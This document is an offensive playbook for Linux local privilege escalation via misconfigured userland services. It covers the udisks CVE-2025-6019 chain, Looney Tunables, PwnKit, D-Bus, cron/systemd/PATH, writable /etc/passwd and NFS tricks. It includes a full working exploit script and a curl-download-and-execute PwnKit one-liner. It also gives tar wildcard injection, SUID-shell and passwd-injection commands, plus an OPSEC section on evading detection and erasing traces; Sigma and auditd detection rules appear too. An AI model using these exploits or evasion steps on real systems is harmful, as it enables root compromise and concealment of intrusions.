# Service Misconfiguration & Userland LPE

Privileged userland daemons and helpers (`udisks`, `polkit`/`pkexec`, PAM, the dynamic loader,
`cron`, `systemd`, NFS) are the second-richest LPE surface after SUID/sudo. This cluster covers the
2025 udisks/PAM chain, Looney Tunables, PwnKit, polkit/D-Bus abuse, and the classic-but-still-common
cron/PATH/writable-file/NFS techniques.

## udisks + libblockdev loop-mount LPE — CVE-2025-6019 (+ CVE-2025-6018) (VERIFIED, KEV/ITW)

Discovered by **Qualys TRU** (Jun 2025). udisks ships by default on nearly every desktop/server Linux,
making this near-universal.

- **CVE-2025-6019** (libblockdev via udisks, CVSS 7.0, CWE-250): an `allow_active` user can reach root.
  During a filesystem **resize/check**, udisks/libblockdev mounts the user-supplied image **without
  `nosuid`/`nodev`**. Attacker crafts an XFS image containing a SUID-root shell, attaches it as a loop
  device, asks udisks to resize/check it, then executes the SUID shell from the temporary mount.
- **CVE-2025-6018** (PAM config on openSUSE Leap 15 / SLES 15, CWE-863): lets a remote SSH user reach
  polkit **`allow_active`** (normally console-only). Chaining 6018→6019 turns an unprivileged SSH
  session into root. (6018 does **not** affect default Ubuntu — there the 6019 path needs an existing
  `allow_active`/console session.) Confirmed exploitable on Ubuntu, Debian, Fedora, openSUSE.

**Working PoC (CVE-2025-6019, matches public guinea/Venturella PoCs):**

```bash
#!/bin/bash
# CVE-2025-6019 — udisks/libblockdev SUID loop-mount LPE. Needs allow_active (console or via 6018).
set -e
IMG=/dev/shm/x.img
# 1. build an XFS image carrying a SUID-root shell
dd if=/dev/zero of="$IMG" bs=1M count=320 status=none
mkfs.xfs -q "$IMG"
MNT=$(mktemp -d); sudo mount -o loop "$IMG" "$MNT" 2>/dev/null || mount -o loop "$IMG" "$MNT"
cp /bin/bash "$MNT/rootshell"; chmod 4755 "$MNT/rootshell"   # SUID; preserved in XFS metadata
umount "$MNT"
# 2. attach as loop device through udisks (no password needed for allow_active)
DEV=$(udisksctl loop-setup -f "$IMG" --no-user-interaction | grep -oE '/dev/loop[0-9]+')
# 3. trigger the maintenance mount (Resize/Check) which mounts WITHOUT nosuid, then race the window
#    'sniper' watches /proc/mounts and execs the SUID shell the instant it appears
( while :; do M=$(grep -m1 "$DEV" /proc/mounts | awk '{print $2}'); \
    [ -n "$M" ] && [ -u "$M/rootshell" ] && exec "$M/rootshell" -p; done ) &
udisksctl mount -b "$DEV" --no-user-interaction 2>/dev/null || \
  dbus-send --system --print-reply --dest=org.freedesktop.UDisks2 \
    "/org/freedesktop/UDisks2/block_devices/$(basename $DEV)" \
    org.freedesktop.UDisks2.Filesystem.Check dict:string:variant: 2>/dev/null
wait
```

Hardening that neutralizes it: change polkit rule `org.freedesktop.udisks2.modify-device` from
`allow_active=yes` to `auth_admin`; patch `udisks2`/`libblockdev`; fix SUSE PAM so SSH users aren't
granted `allow_active`.

## Looney Tunables — CVE-2023-4911 (VERIFIED, CISA KEV)

glibc `ld.so` buffer overflow processing `GLIBC_TUNABLES` (CWE-787, CVSS 7.8). Introduced Apr 2021,
disclosed by Qualys Oct 2023. A `tunable1=tunable2=value` string is mis-parsed, copying more than the
buffer holds; the loader runs with elevated privs for SUID programs, so the overflow overwrites the
library search-path pointer → loads an attacker `libc.so.6` → root. Default-vuln on **Fedora 37/38,
Ubuntu 22.04/23.04, Debian 12/13** (glibc ≤ 2.37). Not musl/Alpine.

```bash
# Vuln smoke test — segfault on a vulnerable ld.so:
env -i "GLIBC_TUNABLES=glibc.malloc.tcache_max=glibc.malloc.tcache_max=A" "A=A" /usr/bin/su --help 2>&1 | head
# Public weaponized PoC: blasty's gnu-acme.py builds a malicious libc.so.6 and pops a root shell.
python3 gnu-acme.py -t /usr/bin/su   # example target; see exploit for options
```

Exceptions (NOT exploitable via this method): `sudo` (own RUNPATH `/usr/libexec/sudo`), `chage`/`passwd`
on Fedora (SELinux), `snap-confine` on Ubuntu (AppArmor). Mitigate: patch glibc; RH SystemTap script
kills SUID programs invoked with `GLIBC_TUNABLES` in env.

## PwnKit — CVE-2021-4034 (VERIFIED, historical, still on long-LTS/appliances)

polkit `pkexec` (SUID) OOB write when `argc==0`: pkexec reads the environment as `argv[1..]`, letting
you inject `GCONV_PATH` → load an attacker GConv module as root (CWE-787). Affects polkit 0.113–0.118
(2009-2022) — nearly every distro before the Jan 2022 patch.

```bash
# Check presence + version
which pkexec && pkexec --version
# One-shot public exploit:
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o /dev/shm/pk
chmod +x /dev/shm/pk && /dev/shm/pk     # instant root shell on vulnerable hosts
```

## polkit / D-Bus service abuse (general)

Beyond named CVEs, system D-Bus services running as root with permissive policies are an LPE surface.

```bash
busctl list                                              # enumerate system services + owners (uid)
busctl --system tree org.freedesktop.PackageKit 2>/dev/null
# Inspect policy for missing user restrictions:
grep -RinE 'allow.*send_destination|<allow' /etc/dbus-1/system.d/ /usr/share/dbus-1/system.d/ 2>/dev/null
pkaction | sort                                          # polkit actions; look for allow_active=yes
pkcheck --action-id <id> --process $$                    # test if your session is authorized
# Abuse classes: services that exec commands from user input, modify system files (PackageKit,
# NetworkManager, systemd1, accounts-daemon), or have authentication-bypass logic.
```

## cron / systemd / PATH / writable-file abuse (classic, still prevalent)

```bash
# --- cron: find root jobs running attacker-writable scripts or wildcard args ---
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
# Use pspy64 to catch jobs not in static files. Then, if script is writable:
echo 'cp /bin/bash /tmp/.b && chmod 4755 /tmp/.b' >> /path/to/root_cron_script.sh

# Wildcard injection if a root job runs e.g.  tar czf /backup/b.tgz *  in a writable dir:
cd /writable/dir
echo 'cp /bin/bash /tmp/.b && chmod 4755 /tmp/.b' > x.sh
touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh x.sh'

# --- systemd: writable unit / timer / writable ExecStart binary ---
find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null
systemctl list-timers --all 2>/dev/null
# If a unit's ExecStart points to a writable path, replace it; if a *.service file is writable:
#   set ExecStart=/bin/sh -c 'cp /bin/bash /tmp/.b && chmod 4755 /tmp/.b' ; then daemon-reload+restart
# Writable .timer that triggers a root service is equivalent.

# --- PATH hijack on a root cron/service that calls a bare command name ---
echo "$PATH" | tr ':' '\n'   # writable dir earlier than /usr/bin? relative '.'? -> drop fake binary

# --- writable /etc/passwd or /etc/shadow ---
ls -l /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/* 2>/dev/null
# If /etc/passwd is writable (and root has '!'/'x' allowing a 2nd entry):
echo "r00t:$(openssl passwd -6 Passw0rd!):0:0:root:/root:/bin/bash" >> /etc/passwd && su r00t
# If /etc/shadow readable: dump and crack root hash offline (hashcat -m 1800 sha512crypt).
```

## NFS no_root_squash (classic)

If an export is `no_root_squash`, files you create as root on the client keep uid 0 on the server.

```bash
showmount -e <server>                                   # list exports; look for no_root_squash
# As root on a box you control, mount the export and drop a SUID shell:
mkdir /mnt/x && mount -t nfs <server>:/export /mnt/x
cp /bin/bash /mnt/x/rootbash && chmod 4755 /mnt/x/rootbash
# On the target (low-priv) where /export is the real path:
/export/rootbash -p     # -> uid=0
```

## Detection

**Sigma — udisks loop-mount LPE (CVE-2025-6019):**

```yaml
title: Potential udisks/libblockdev SUID Loop-Mount LPE (CVE-2025-6019)
id: 1d3c5b9a-udisks-2025-6019
logsource: { product: linux, category: process_creation }
detection:
  sel_loop:
    Image|endswith: ['/udisksctl', '/losetup']
    CommandLine|contains: ['loop-setup', 'mkfs.xfs', '/dev/loop']
  sel_dbus:
    CommandLine|contains: ['org.freedesktop.UDisks2.Filesystem.Resize', 'org.freedesktop.UDisks2.Filesystem.Check']
  condition: sel_loop or sel_dbus
level: high
```

**auditd:**
```
-a always,exit -F arch=b64 -S mount -k mount_event            # catch mounts missing nosuid
-w /etc/passwd  -p wa -k passwd_change
-w /etc/shadow  -p wa -k shadow_change
-w /etc/cron.d/ -p wa -k cron_change
-w /etc/systemd/system/ -p wa -k unit_change
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/pkexec -k pkexec_exec
```

**IOCs / EDR:**
- CVE-2025-6019: a loop device backed by a user XFS image mounted in `/tmp`/`/run` **without nosuid**;
  a SUID-root `bash` copy on a loop mount; `udisksctl loop-setup`/D-Bus `Filesystem.Resize|Check` from
  a non-admin; the tight `/proc/mounts` polling loop (the "sniper").
- Looney Tunables: setuid execve carrying `GLIBC_TUNABLES=...=...=` (duplicated `=`); SIGSEGV cores from
  setuid binaries. Elastic prebuilt rule "Potential Privilege Escalation via CVE-2023-4911".
- PwnKit: `pkexec` with empty argv (`argc==0`); env `GCONV_PATH=`; a fresh GConv `.so` + dir under a
  writable path; Sigma `proc_creation_lnx_susp_pkexec_no_command`.
- cron/PATH/unit: new/modified files in `/etc/cron*`, `/etc/systemd/*`; `systemctl daemon-reload` by a
  non-admin; a root-owned process executing a world-writable script.

## OPSEC

- **Touches:** auditd `mount`/`execve`/file-watch records; loop devices + the dropped XFS image (6019);
  GConv module + dir (PwnKit); modified cron/unit/passwd files (durable IOCs); SIGSEGV cores (tunables).
- **Cleanup:** `udisksctl unmount`/`umount` + `losetup -d` the loop dev, `shred -u` the image; remove
  the GConv `.so`/dir; revert any added `/etc/passwd` line and restore cron/unit file mtimes
  (`touch -r <ref>`); delete SUID `/tmp/.b` backups; remove core dumps.
- **Evasion:** these userland LPEs are far quieter and crash-free vs kernel exploits — prefer them when
  versions are in range. Stage images/modules in `/dev/shm`; use dotted names; avoid leaving the loop
  device attached. The udisks path is the standout 2025 default-config win on desktop-class Linux.

## References

- Qualys TRU, **CVE-2025-6018/6019 (PAM→udisks chain)** — https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-uncovers-chained-lpe-suse-15-pam-to-full-root-via-libblockdev-udisks
- Ubuntu/Canonical advisory (udisks/libblockdev LPE) — https://ubuntu.com/blog/udisks-libblockdev-lpe-vulnerability-fixes-available
- SecureLayer7, CVE-2025-6019 analysis — https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/
- Qualys, **Looney Tunables CVE-2023-4911** — https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so
- Qualys / Kudelski, **PwnKit CVE-2021-4034** — https://kudelskisecurity.com/research/pwnkit-local-privilege-escalation-lpe-in-polkits-pkexec
- GTFOBins (cron/tar wildcard, writable-file primitives) — https://gtfobins.github.io
